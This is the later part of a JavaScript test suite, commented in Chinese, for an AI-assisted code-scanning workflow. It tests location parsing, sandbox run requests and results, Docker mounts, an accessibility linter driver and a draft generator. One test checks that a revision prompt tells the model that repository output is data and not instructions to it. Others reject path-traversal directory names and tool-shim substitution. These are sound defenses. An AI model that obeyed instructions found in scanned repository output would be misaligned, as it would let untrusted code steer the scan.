    const whole = logic.digestFindings([finding(1)], 4000);
    assert(whole.split("\n").length === 1 && !whole.includes("未列出"), "everything fits → no truncation note");
  });

  check("LOGIC:迁移文档的辅助函数 — 引用提取、流程名归一化、步骤包含", () => {
    assert(logic.citedLocations("调用 src/api/orders.js:4,见 /tmp/acme.log:3 与 localhost:8080").join(",") === "src/api/orders.js:4", "only repo-relative citations count");
    assert(logic.citedLocations("package.json:7 与 src/app.js:8-19").join(",") === "package.json:7,src/app.js:8", "line ranges keep their first line");
    assert(logic.nameKey("响应 GET /orders：按城市") === logic.nameKey("响应getorders按城市"), "names are compared without punctuation or case");
    // 真机输出:同一条 /orders 流程被两个批次各追一次,措辞与名字都不同,但走到的位置基本一样。
    const flow = (name, entry, steps) => ({ name, repo: "r", entry, entryLocation: entry, steps: [], verifiedSteps: steps, systems: [], risks: [], unverified: [] });
    const tracedTwiceA = flow("按 /orders 请求列出三个固定客户的订单并按 gold 档计价", "src/app.js:8", [
      "src/app.js:8 转", "src/api/orders.js:5 客户", "src/db/orders.js:5 查询", "src/data/db.js:6 emit", "src/api/orders.js:7 计价", "src/coverage/pricing.js:19 折扣", "src/api/orders.js:8 响应",
    ]);
    const tracedTwiceB = flow("GET /orders:读取订单并按 gold 档计价后返回", "src/app.js:8", [
      "src/app.js:8 分发", "src/api/orders.js:5 列表", "src/db/orders.js:6 执行", "src/data/db.js:6 发布", "src/api/orders.js:7 调用", "src/coverage/pricing.js:19 累加", "src/api/orders.js:8 写出",
    ]);
    assert(logic.stepOverlap(tracedTwiceA, tracedTwiceB) >= logic.FLOW_SAME_OVERLAP, `the same flow traced twice must merge: ${logic.stepOverlap(tracedTwiceA, tracedTwiceB)}`);
    const otherBranch = flow("启动 HTTP 服务", "src/app.js:29", ["src/app.js:29 listen", "src/app.js:24 createServer"]);
    assert(logic.stepOverlap(tracedTwiceA, otherBranch) < logic.FLOW_SAME_OVERLAP, "a different branch stays separate");
    assert(logic.stepOverlap(tracedTwiceA, flow("空", "x:1", [])) === 0, "no steps → no overlap");
  });

  check("LOGIC:位置解析容忍一行多个位置与括号;只写文件名的引用按前文目录补全", () => {
    const multi = logic.parseLocation("src/data/db.js:3、src/data/db.js:10 事件发射器是模块级单例");
    assert(multi.path === "src/data/db.js" && multi.line === 3 && multi.note === "src/data/db.js:10 事件发射器是模块级单例", JSON.stringify(multi));
    const bracketed = logic.parseLocation("src/coverage/pricing.js:20 -> applyDiscount(pricing.js:3-6)");
    assert(bracketed.path === "src/coverage/pricing.js" && bracketed.line === 20 && bracketed.note.includes("applyDiscount(pricing.js:3-6)"), JSON.stringify(bracketed));
    assert(logic.parseLocation("src/app.js:8-19 路由").line === 8, "ranges keep the first line");
    assert(logic.parseLocation("package.json:7").line === 7 && logic.parseLocation("package.json:7").note === "", "a bare location has an empty note");
  });

  check("LOGIC:发现核对取第一个被引用的位置(真实运行里读失败过的写法),单个位置的旧写法不受影响", () => {
    const first = logic.whereTarget;
    assert(first("src/util/currency.js:2(另 src/util/percent.js:2、src/util/legacy.js:3)").path === "src/util/currency.js", "annotation with more locations");
    assert(first("src/app.js:9/12/15/18").line === 9, "several lines of one file");
    assert(first("src/data/db.js:3,10").path === "src/data/db.js" && first("src/data/db.js:3,10").line === 3, "comma-separated lines");
    const many = first("src/security/login.js:9; src/telemetry/checkout.js:21; src/telemetry/sync.js");
    assert(many.path === "src/security/login.js" && many.line === 9, "semicolon-separated locations");
    assert(first("package.json:8; test/tax.test.js").line === 8, "a location without a line after one with a line");
    assert(first("src/telemetry/logger.js:3-5; src/compliance/audit.js:3-5").line === 3, "line ranges keep their first line");
    assert(first("src\\telemetry\\notify.js:5").path === "src/telemetry/notify.js", "backslashes are normalised");
    const bare = first("src/telemetry/sync.js");
    assert(bare.path === "src/telemetry/sync.js" && bare.line === 0, "a path without a line still resolves");
    assert(first("Dockerfile:3").line === 3 && first("Dockerfile:3").path === "Dockerfile", "paths without an extension keep their line");
    assert(first("src/api/orders.js:4-9 订单路由没有鉴权").line === 4, "trailing prose is ignored");
    // 以行号结尾的多位置写法:整串正则也会匹配,但必须仍然取第一个位置。
    const ending = first("src/a.js:9; src/b.js:21");
    assert(ending.path === "src/a.js" && ending.line === 9, `two locations ending with a line: ${JSON.stringify(ending)}`);
    const noExtension = first("src/a.js:2; Makefile:3");
    assert(noExtension.path === "src/a.js" && noExtension.line === 2, `a second location without an extension must not be swallowed: ${JSON.stringify(noExtension)}`);
    const neither = first("Makefile:3; Dockerfile:7");
    assert(neither.path === "Makefile" && neither.line === 3, JSON.stringify(neither));
    assert(first("src/a.js:3、src/b.js:10").line === 3, "、-separated locations ending with a line");
    // GitHub 式行号只在没有「路径:行号」可解析时才认:文件名里的 #L2 不能被改写。
    const hashInside = first("src/build#L2/app.js:9");
    assert(hashInside.path === "src/build#L2/app.js" && hashInside.line === 9, JSON.stringify(hashInside));
    const github = first("src/a.js#L12");
    assert(github.path === "src/a.js" && github.line === 12, "GitHub-style line anchor");
    const githubRange = first("src/a.js#L3-L5");
    assert(githubRange.path === "src/a.js" && githubRange.line === 3, JSON.stringify(githubRange));
    const sentence = first("src/a.js:12.");
    assert(sentence.path === "src/a.js" && sentence.line === 12, "a trailing sentence period");
    // 旧解析器一直能核对的单个位置写法:引用位置的提取不认空格和中文,所以这些必须走整串匹配。
    const spaced = first("src/my file.js:12");
    assert(spaced.path === "src/my file.js" && spaced.line === 12, "a path with a space");
    const cjk = first("docs/说明.md:7");
    assert(cjk.path === "docs/说明.md" && cjk.line === 7, "a path with CJK characters");
    const column = first("src/a.ts:12:5");
    assert(column.path === "src/a.ts" && column.line === 12, "line:column keeps the line");
    assert(first("src/a.ts:12").path === "src/a.ts" && first("src/a.ts:12").line === 12, "the plain form");
  });

  check("LOGIC:沙箱运行请求归一化 — 不合规的整条丢弃,每批最多 8 条并留痕", () => {
    const notes = [];
    const good = { purpose: "跑测试", command: ["npm", "test"] };
    const runs = logic.normalizeSandboxRuns(
      [
        good,
        { purpose: "", command: ["x"] },
        { purpose: "p", command: [] },
        { purpose: "p", command: "npm" },
        // 实现评审指出:悄悄丢掉不合规的 argv 片段会变成另一条命令,必须整条拒绝。
        { purpose: "p", command: ["sh", "-c", "", "echo hi"] },
        { purpose: "p", command: ["node", 1, "x.js"] },
        { purpose: "p", command: ["node", "a\u0000b"] },
        // 实现评审指出:过长的规格要作为命令行参数传给编码片段,命令行有长度上限,必须在脚本里就拒绝。
        { purpose: "p", command: ["node", "x".repeat(4000), "y".repeat(4000), "z".repeat(4000), "w".repeat(4000), "v".repeat(4000)] },
        // 实现评审指出:转义后还会变长,所以脚本侧的字符上限比编码片段的字节上限更紧(8192 字符)。
        { purpose: "p", command: ["node", "x".repeat(2800), "y".repeat(2800), "z".repeat(2800)] },
        "junk",
        ...Array.from({ length: 10 }, (_, index) => ({ purpose: `r${index}`, command: ["node", "-e", String(index)] })),
      ],
      notes,
    );
    assert(runs.length === logic.SANDBOX_MAX_RUNS_PER_BATCH, `expected the cap, got ${runs.length}`);
    assert(runs[0].purpose === "跑测试" && runs[0].command.join(" ") === "npm test", "a well-formed request is kept");
    assert(runs[1].command.join(" ") === "node -e 0", `a request with a malformed argv is dropped whole, got ${JSON.stringify(runs[1])}`);
    assert(notes.filter((note) => note.includes("不合规")).length === 8, `every rejected request is noted, got ${JSON.stringify(notes)}`);
    assert(notes.some((note) => note.includes("上限")), "overflow is noted, not silent");
    assert(logic.normalizeSandboxRuns(undefined, []).length === 0 && logic.normalizeSandboxRuns("x", []).length === 0, "absent or malformed field → no runs");
  });

  check("LOGIC:沙箱结果分类 — 容器失败 / docker 层失败 / 执行器无输出 / 正常 / 超时 / 未能启动", () => {
    const dockerOk = (exitCode, stdout, stderr = "") => ({ ok: true, exitCode, stdout, stderr, note: "" });
    const broken = logic.sandboxResult({ ...dockerOk(-1, ""), ok: false, note: "timeout" }, null);
    assert(broken.executed === false && broken.note.includes("容器调用失败"), JSON.stringify(broken));
    const layer = logic.sandboxResult(dockerOk(125, ""), null);
    assert(layer.executed === false && layer.exitCode === null && layer.note.includes("docker 退出码 125"), "docker's own failure");
    const none = logic.sandboxResult(dockerOk(1, "", "boom"), null);
    assert(none.executed === false && none.note.includes("boom"), "no runner output → the runner's stderr is the reason");
    const silent = logic.sandboxResult(dockerOk(7, ""), null);
    assert(silent.note.includes("docker 退出码 7"), "and when even stderr is empty, the exit code is");
    const ran = logic.sandboxResult(dockerOk(0, ""), { ok: true, status: 1, signal: "", timedOut: false, spawnError: "", stdoutTail: "out", stderrTail: "err" });
    assert(ran.executed === true && ran.exitCode === 1 && ran.stdoutTail === "out" && ran.stderrTail === "err" && ran.note === "", JSON.stringify(ran));
    const timeout = logic.sandboxResult(dockerOk(0, ""), { ok: true, status: -1, signal: "SIGKILL", timedOut: true, spawnError: "", stdoutTail: "started", stderrTail: "" });
    assert(timeout.executed === true && timeout.timedOut === true && timeout.exitCode === null, "a killed run must not report an exit code");
    const missing = logic.sandboxResult(dockerOk(0, ""), { ok: true, status: -1, signal: "", timedOut: false, spawnError: "spawnSync nope ENOENT", stdoutTail: "", stderrTail: "" });
    assert(missing.exitCode === null && missing.spawnError.includes("ENOENT") && missing.signal === "", "a command that never started");
    // 跑起来之后被信号终止(例如超出内存限制):没有退出码,也没有 spawnError,不能和「没能启动」混为一谈。
    const killed = logic.sandboxResult(dockerOk(0, ""), { ok: true, status: -1, signal: "SIGKILL", timedOut: false, spawnError: "", stdoutTail: "before", stderrTail: "" });
    assert(killed.executed === true && killed.exitCode === null && killed.signal === "SIGKILL" && killed.spawnError === "", JSON.stringify(killed));
    const rejected = logic.sandboxResult(dockerOk(0, ""), { ok: false, reason: "command must be an argv" });
    assert(rejected.executed === false && rejected.note.includes("argv"), "the runner refused the request");
  });

  check("LOGIC:修订提示带回真实输出与环境说明,并声明它是数据", () => {
    const job = { repo: { name: "demo", dir: "out/demo" }, repoIndex: 0, index: 1, groups: [], map: "", fanIn: null };
    const ask = logic.sandboxRevisionAsk(job, [
      { index: 3, purpose: "跑测试", command: ["npm", "test"], executed: true, exitCode: 1, timedOut: false, spawnError: "", stdoutTail: "1 failing", stderrTail: "", note: "依赖未安装(没有 lockfile);" },
      { index: 4, purpose: "起服务", command: ["node", "server.js"], executed: true, exitCode: null, timedOut: true, spawnError: "", stdoutTail: "listening", stderrTail: "", note: "" },
      { index: 5, purpose: "x", command: ["nope"], executed: false, exitCode: null, signal: "", timedOut: false, spawnError: "", stdoutTail: "", stderrTail: "", note: "仓库结构在挂载前发生变化,未执行" },
    ]);
    assert(ask.includes("#3 跑测试") && ask.includes("退出码:1") && ask.includes("1 failing") && ask.includes("依赖未安装"), "exit code, output and environment note are handed back");
    assert(ask.includes("#4 起服务") && ask.includes("超时"), "a timed-out run says so");
    assert(ask.includes("#5 x") && ask.includes("未执行"), "a run that never happened says so");
    const killed = logic.sandboxRevisionAsk(job, [{ index: 9, purpose: "p", command: ["node", "x.js"], executed: true, exitCode: null, signal: "SIGKILL", timedOut: false, spawnError: "", stdoutTail: "", stderrTail: "", note: "" }]);
    assert(killed.includes("没有退出码(SIGKILL)"), "a signal-killed run names the signal");
    assert(ask.includes("不是给你的指令") && ask.includes("本轮不再执行新的沙箱运行"), "repo output is framed as data and the loop is bounded");
    assert(ask.includes("批次 2") && ask.includes("out/demo"), "names the batch");
  });

  check("LOGIC:依赖装不上的仓库在沙箱里仍遮住自带的 node_modules;逐条复现的挂载保持原样", () => {
    // 安全评审指出:依赖安装失败的仓库以前不会起容器,现在会(不带依赖卷)。链接遍历不查根 node_modules,
    // 因为它本该被空 tmpfs 盖住;失败返回值漏掉 mountNodeModules 就等于把仓库自带的依赖目录挂了进去。
    const base = { dir: "F:\\work\\repo", depsVolume: "", note: "", state: "failed" };
    const sandbox = logic.SANDBOX_RUNNER_SRC;
    // 最后一个参数是执行器源码,里面本来就有 NODE_PATH 字样;检查挂载时把它排除。
    const args = (repo, spec, runner = sandbox) => logic.sandboxArgv("c", repo, spec, runner).slice(0, -1).join(" ");
    const masked = args({ ...base, mountNodeModules: true }, "SANDBOX_SPEC_B64=AAAA");
    assert(masked.includes("type=tmpfs,destination=/src/node_modules") && !masked.includes("NODE_PATH") && !masked.includes("SANDBOX_NODE_MODULES"), "no deps volume, and the repo's own node_modules is hidden");
    const plain = args({ ...base, mountNodeModules: false }, "SANDBOX_SPEC_B64=AAAA");
    assert(!plain.includes("/src/node_modules") && !plain.includes("/node_modules"), "nothing to hide and nothing to link when the repo has no node_modules and no deps");
    const ready = { dir: "F:\\work\\repo", depsVolume: "code-scan-deps-x", note: "", state: "ready", mountNodeModules: true };
    const linked = args(ready, "SANDBOX_SPEC_B64=AAAA");
    assert(linked.includes("type=volume,source=code-scan-deps-x,target=/deps,readonly") && linked.includes("NODE_PATH=/deps/tree"), "installed deps come from the volume only");
    assert(linked.includes("SANDBOX_NODE_MODULES=/src/node_modules") && linked.includes("tmpfs-size=64m,tmpfs-mode=1777"), "with the repo's own node_modules masked, the writable link view lives there");
    // 实现评审指出:只靠 NODE_PATH 时 ESM 的 import 找不到依赖,npm 脚本的 PATH 里也没有 .bin。
    // 仓库没有 node_modules 时 /src 只读、建不出目录,所以视图挂在 /node_modules(Node 的解析会一路向上找到它)。
    const noModules = args({ ...ready, mountNodeModules: false }, "SANDBOX_SPEC_B64=AAAA");
    assert(noModules.includes("type=tmpfs,destination=/node_modules,tmpfs-size=64m,tmpfs-mode=1777") && noModules.includes("SANDBOX_NODE_MODULES=/node_modules"), "a writable /node_modules for the link view");
    assert(!noModules.includes("/src/node_modules"), "and no attempt to mount inside the read-only /src");
    // 逐条复现走同一个构造函数,但执行器不是沙箱执行器:挂载必须和引入沙箱通道之前完全一样。
    const repro = args(ready, "REPRO_SPEC_B64=AAAA", "repro-runner");
    assert(repro.includes("type=tmpfs,destination=/src/node_modules,tmpfs-size=16m,tmpfs-mode=0555"), "the repro mask stays small and read-only");
    assert(!repro.includes("SANDBOX_NODE_MODULES") && !repro.includes("destination=/node_modules"), "no link view and no extra mount for repro");
    assert(!args({ ...ready, mountNodeModules: false }, "REPRO_SPEC_B64=AAAA", "repro-runner").includes("destination=/node_modules"), "nor for a repo without node_modules");
    const reproArgv = logic.sandboxArgv("c", ready, "REPRO_SPEC_B64=AAAA", "repro-runner");
    assert(reproArgv.at(-1) === "repro-runner" && reproArgv.at(-3) === logic.REPRO_IMAGE && reproArgv.includes("--entrypoint"), "the image is pinned by digest and the runner is the last argument");
    assert(logic.REPRO_IMAGE.includes("@sha256:"), "digest pinned");
  });

  await checkAsync("LOGIC:发现核对读开头那个位置的文件;路径不对时不发起读取", async () => {
    const disk = logic.virtualFiles;
    const reads = logic.readLog;
    disk.clear();
    reads.length = 0;
    disk.set("out/demo/src/a.js", ["function paginate() {", "  return pages.length + 1;", "}"].join("\n"));
    disk.set("out/demo/src/b.js", ["const other = require('./a');", "module.exports = { other };"].join("\n"));
    const base = { repo: "demo", dir: "out/demo", problem: "p", severity: "high", fix: "f" };
    // where 里写了三个位置:核对用开头那个,读的也只有它。
    const multi = await logic.groundFinding({ ...base, where: "src/a.js:2(另 src/b.js:1、src/b.js:2)", evidence: "分页多出一页:`return pages.length + 1;`" });
    assert(multi.holds === true && reads.join() === "out/demo/src/a.js", `${JSON.stringify(multi)} reads=${reads.join()}`);
    // 文件不存在、位置是目录、只写了文件名:都是「未核对」。读取只走 READ_SOURCE_CODE,路径不对时它返回 ok:false。
    for (const where of ["nope.js:3", "src:1", "pricing.js", "src/app.js:9/12/15/18", "src/security/login.js:9; src/x/checkout.js:21"]) {
      const missing = await logic.groundFinding({ ...base, where, evidence: " whatever snippet here " });
      assert(missing.holds === false && missing.reason.includes("文件不存在或不可读"), `${where}: ${JSON.stringify(missing)}`);
    }
    // 读到的只有真实存在的文件;多位置写法只读开头那个位置所在的文件。
    assert(logic.readLog.filter((one) => !logic.virtualFiles.has(one)).length > 0, "a missing path is looked up through the snippet and comes back as a plain failure");
    assert(logic.readLog.includes("out/demo/src/a.js") && !logic.readLog.includes("out/demo/src/b.js"), `only the leading location is read: ${logic.readLog.join()}`);
    // 绝对路径(工作区内)折算成仓库相对路径;仓库相对路径原样使用,哪怕它的开头恰好和扫描目录同名。
    logic.setWorkspaceRoot("F:/work");
    disk.set("lib/lib/a.js", "line one\nline two\n");
    reads.length = 0;
    const absolute = await logic.groundFinding({ ...base, dir: "lib", where: "F:\\work\\lib\\lib\\a.js:2", evidence: "原文 `line two`" });
    assert(absolute.holds === true && reads.join() === "lib/lib/a.js", JSON.stringify(absolute));
    reads.length = 0;
    const relative = await logic.groundFinding({ ...base, dir: "lib", where: "lib/a.js:2", evidence: "原文 `line two`" });
    assert(relative.holds === true && reads.join() === "lib/lib/a.js", "a repo-relative path must not be re-mapped onto another file");
    // 位置对得上但引文不在:核对不通过,原因写明;读过的只有那一个文件。
    const wrong = await logic.groundFinding({ ...base, where: "src/a.js:2", evidence: "编的:`return pages.length - 1;`" });
    assert(wrong.holds === false && wrong.reason.includes("都不存在"), JSON.stringify(wrong));
    logic.setWorkspaceRoot("");
  });
}


/* ------------------------------------------------------------------------- */
/* 新工具:test-reach(依赖图)与 a11y(eslint jsx-a11y)                            */
/* ------------------------------------------------------------------------- */

const TOOL_RUNNERS = { knip: "runKnip", jscpd: "runJscpd", "test-reach": "runTestReach", a11y: "runA11y" };

check("TOOL:四个工具在校验、分发、规划三处的名单一致", () => {
  for (const [tool, runner] of Object.entries(TOOL_RUNNERS)) {
    assert(SOURCE.includes(`tool === "${tool}" && !caps.`), `normalizeSelectors must gate ${tool}`);
    assert(SOURCE.includes(`name === "${tool}" && ctx.caps.`), `executeSelector must dispatch ${tool}`);
    assert(SOURCE.includes(`outcome = await ${runner}(ctx);`), `toolOutcome must run ${runner}`);
  }
  const plannerTools = sourceRegion("- kind=tool:query 取", "\n");
  for (const tool of Object.keys(TOOL_RUNNERS)) {
    assert(plannerTools.includes(tool), `planner must list ${tool}`);
  }
});

check("TOOL:无障碍工具不经 npx 启动任何命令,工具包只从专属目录解析", () => {
  const region = sourceRegion("async function runA11y(", "async function runScopeSelector(");
  assert(!region.includes("runNpx(") && !region.includes('"--", "node"') && !region.includes('"eslint", "--version"'), "npx runs bins through whatever node PATH resolves first; a workspace shim could substitute it");
  assert(region.includes('"config", "get", "cache"') && region.includes("A11Y_TOOLS_DIR_CODE"), "the tools directory lives under npm's own cache");
  assert(region.includes('"install",') && region.includes('"--prefix",') && region.includes('"--ignore-scripts"'), "packages are installed at exact versions into that directory, without lifecycle scripts");
  assert(region.includes('world.run("node", [ctx.a11yDriverPath, ctx.repo.dir, toolsDir, pins]'), "the driver runs on the host node");
  assert(region.includes("if (hits === null)") && region.includes("未检查"), "unusable tool output must be reported as not-checked, never as clean");
  const tools = rawBlock("A11Y_TOOLS_DIR_CODE");
  assert(tools.includes("const [, cacheRootArg, dirName, pinsArg] = process.argv;"), "a node -e snippet has no script slot in argv");
  assert(tools.includes("toolsDir.startsWith(cacheRoot + path.sep)") && tools.includes("fs.realpathSync"), "the tools directory is confined to the npm cache");
  assert(tools.includes("missing.push(name)"), "missing or mismatched packages are detected before anything is loaded");
  const driver = rawBlock("A11Y_DRIVER_SRC");
  assert(driver.includes("overrideConfigFile: true") && driver.includes("allowInlineConfig: false") && !driver.includes("--config"), "no config file lookup, and no inline eslint-disable from scanned sources");
  assert(driver.includes('createRequire(path.join(toolsDir, "node_modules"'), "packages resolve from the tools directory only");
  assert(driver.includes("version !== pins[name]") && driver.includes('indexOf("jsx-a11y/") !== 0'), "versions are re-checked and only a11y rules reach the signal stream");
  assert(!driver.includes("${") && !tools.includes("${"), "snippet sources must not contain template placeholders");
});

check("TOOL:防顶替检查保持原样", () => {
  // 无障碍工具不再经 npx 启动 eslint,所以不需要单独的闸门;四个现有工具的检查一字未改。
  assert(!SOURCE.includes("a11yBins") && !SOURCE.includes("a11yTools") && !SOURCE.includes("a11yShadowed"), "no a11y-specific branch in the npm guard");
  assert(SOURCE.includes("const tools=['jscpd','knip','madge','ast-grep'];"), "the four-tool shim list is unchanged");
  assert(SOURCE.includes("process.stdout.write(JSON.stringify({npmrc:npmrc,bins:bins}));"), "the guard still returns one bins list");
  assert(SOURCE.includes("a11y: npmOk && npmConfigSafe && !npmToolsShadowed && a11yReady && jsProject"), "a11y still fails closed together with the other npm tools");
});

check("TOOL:无障碍驱动脚本 — 工具目录里版本不符时明确报错退出(不联网)", () => {
  const dir = mkdtemp("a11y-driver-");
  try {
    const driverPath = path.join(dir, "a11y-driver.cjs");
    fs.writeFileSync(driverPath, rawBlock("A11Y_DRIVER_SRC"));
    const pinsBlock = sourceRegion("const A11Y_PACKAGES", "\n];");
    const pins = JSON.stringify(Object.fromEntries([...pinsBlock.matchAll(/\["([^"]+)", "([^"]+)"\]/g)].map((match) => [match[1], match[2]])));
    const wrongEslint = path.join(dir, "tools", "node_modules", "eslint");
    fs.mkdirSync(wrongEslint, { recursive: true });
    fs.writeFileSync(path.join(wrongEslint, "package.json"), JSON.stringify({ version: "8.57.1" }));
    const run = spawnSync(process.execPath, [driverPath, dir, path.join(dir, "tools"), pins], { encoding: "utf8", timeout: 30000 });
    assert(run.status === 2, `expected exit 2, got ${run.status}: ${run.stderr}`);
    assert(run.stderr.includes("工具目录里 eslint 的版本不是固定的 9.39.5"), run.stderr);
    const noArgs = spawnSync(process.execPath, [driverPath], { encoding: "utf8", timeout: 30000 });
    assert(noArgs.status === 2 && noArgs.stderr.includes("usage:"), "missing arguments must be a usage error");
    // 工具目录片段:在临时「缓存根」下按需创建目录并报告缺包;目录名只接受安全字符。
    const toolsCode = rawBlock("A11Y_TOOLS_DIR_CODE");
    const cacheRoot = path.join(dir, "cache-root");
    fs.mkdirSync(cacheRoot, { recursive: true });
    const locate = spawnSync(process.execPath, ["-e", toolsCode, "--", cacheRoot, "tools-test", pins], { encoding: "utf8", timeout: 30000 });
    assert(locate.status === 0, locate.stderr);
    const located = JSON.parse(locate.stdout.trim());
    assert(located.ready === false && located.missing.length === 4 && located.toolsDir.startsWith(fs.realpathSync(cacheRoot)), JSON.stringify(located));
    assert(fs.existsSync(located.toolsDir), "the tools directory is created on demand");
    const badName = spawnSync(process.execPath, ["-e", toolsCode, "--", cacheRoot, "../escape", pins], { encoding: "utf8", timeout: 30000 });
    assert(badName.status === 2 && !fs.existsSync(path.join(dir, "escape")), "a directory name that would escape is rejected");
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

check("DOC:命令文档与 SKILL 的模式表和注册表互相覆盖", () => {
  const registryIds = [...tableRegion("SCAN_MODES").matchAll(/\{ id: "([^"]+)"/g)].map((match) => match[1]);
  for (const [name, file] of [["command", "commands/code-scan.md"], ["skill", "skills/code-scan/SKILL.md"]]) {
    const doc = fs.readFileSync(path.join(here, "..", "code-scan", file), "utf8");
    const docIds = [...doc.matchAll(/^\| `([a-z0-9-]+)` \|/gm)].map((match) => match[1]);
    for (const id of registryIds) assert(docIds.includes(id), `${name} doc is missing mode ${id}`);
    for (const id of docIds) assert(registryIds.includes(id), `${name} doc lists unknown mode ${id}`);
  }
  const command = fs.readFileSync(path.join(here, "..", "code-scan", "commands", "code-scan.md"), "utf8");
  assert(command.includes("--list-modes") && command.includes("--mode"), "the command must validate the mode through the generator");
  assert(command.includes("AskUserQuestion") && command.includes("(Recommended)"), "the command must offer a picker when nothing is said");
  assert(command.includes('mode: "<模式 id>"'), "CreateWorkflow args must carry the mode");
});

/* ------------------------------------------------------------------------- */
/* 生成器:扫描方向在写草稿之前校验,模式表与模板是同一份                        */
/* ------------------------------------------------------------------------- */

const GENERATOR = path.join(here, "..", "code-scan", "scripts", "generate-draft.mjs");
const REPO_ROOT = path.join(here, "..");

function runGenerator(args) {
  const result = spawnSync(process.execPath, [GENERATOR, "--template", TEMPLATE, ...args], {
    encoding: "utf8",
    timeout: 60000,
    cwd: REPO_ROOT,
  });
  return { status: result.status, stdout: result.stdout || "", stderr: result.stderr || "" };
}

function draftPathOf(stdout) {
  const line = stdout.split(/\r?\n/).find((item) => item.startsWith("draft: "));
  return line === undefined ? "" : line.slice("draft: ".length);
}

check("GEN:--list-modes 列出的模式与模板模式表逐行一致", () => {
  const out = runGenerator(["--list-modes"]);
  assert(out.status === 0, out.stderr);
  const listed = out.stdout.split(/\r?\n/).filter((line) => line.startsWith("mode: "));
  const tableLines = tableRegion("SCAN_MODES").split("\n").filter((line) => line.includes("{ id:"));
  assert(listed.length === tableLines.length, `generator lists ${listed.length}, template has ${tableLines.length}`);
  for (const label of DEVIN_SCAN_TYPES) {
    assert(out.stdout.includes(`| ${label} |`), `Devin scan type missing from the menu: ${label}`);
  }
});

check("GEN:--mode 接受 id、中文名与组合", () => {
  const out = runGenerator(["--mode", "性能,db", "--out", ".code-scan/tmp/gen-mode-test.ts"]);
  assert(out.status === 0, out.stderr);
  assert(out.stdout.includes("mode: perf+db") && out.stdout.includes("dimensions: perf,db"), out.stdout);
  const draft = draftPathOf(out.stdout);
  assert(draft !== "" && fs.existsSync(draft), "draft path must be printed and exist");
  fs.rmSync(draft, { force: true });
});

check("GEN:未识别的方向报错并列出可选项,且不写草稿", () => {
  const out = runGenerator(["--mode", "banana", "--out", ".code-scan/tmp/gen-mode-bad.ts"]);
  assert(out.status === 1, `expected exit 1, got ${out.status}`);
  assert(out.stderr.includes("未识别的扫描方向: banana") && out.stderr.includes("perf(性能)"), out.stderr);
  assert(!fs.existsSync(path.join(REPO_ROOT, ".code-scan", "tmp", "gen-mode-bad.ts")), "no draft may be written for an invalid mode");
});

check("GEN:未指定方向时输出模式表的第一项(full),可以直接作为 args.mode 传回", () => {
  const out = runGenerator(["--out", ".code-scan/tmp/gen-mode-default.ts"]);
  assert(out.status === 0, out.stderr);
  assert(out.stdout.includes("\nmode: full\n") && out.stdout.includes("dimensions: quality,dead-code,perf"), out.stdout);
  assert(!out.stdout.includes("(未指定"), "no human-readable placeholder that would be forwarded as args.mode");
  const draft = draftPathOf(out.stdout);
  assert(draft !== "" && fs.existsSync(draft), "draft path must be printed and exist");
  fs.rmSync(draft, { force: true });
});

check("GEN:组合模式的维度按注册表顺序,与工作流一致", () => {
  const out = runGenerator(["--mode", "perf,quality", "--out", ".code-scan/tmp/gen-mode-order.ts"]);
  assert(out.status === 0 && out.stdout.includes("dimensions: quality,perf"), out.stdout);
  const draft = draftPathOf(out.stdout);
  fs.rmSync(draft, { force: true });
});

check("GEN:plan 插槽出现两次(规划员与流程追踪员)都被替换", () => {
  const configDir = mkdtemp("code-scan-gen-");
  const configPath = path.join(configDir, "models.json");
  fs.writeFileSync(configPath, JSON.stringify({ plan: "provider/strong" }));
  const out = runGenerator(["--config", configPath, "--out", ".code-scan/tmp/gen-mode-plan.ts"]);
  assert(out.status === 0, out.stderr);
  const draft = draftPathOf(out.stdout);
  assert(draft !== "", out.stdout);
  const text = fs.readFileSync(draft, "utf8");
  assert((text.match(/model: "provider\/strong"/g) || []).length === 2, "both plan slots must be replaced");
  assert(!text.includes("/* @model:"), "no marker may survive");
  fs.rmSync(draft, { force: true });
  fs.rmSync(configDir, { recursive: true, force: true });
});

/* ------------------------------------------------------------------------- */

await logicTests();


console.log(`\n${passed} passed, ${failures.length} failed`);
for (const failure of failures) console.log(`- FAIL ${failure}`);
if (failures.length > 0) process.exitCode = 1;
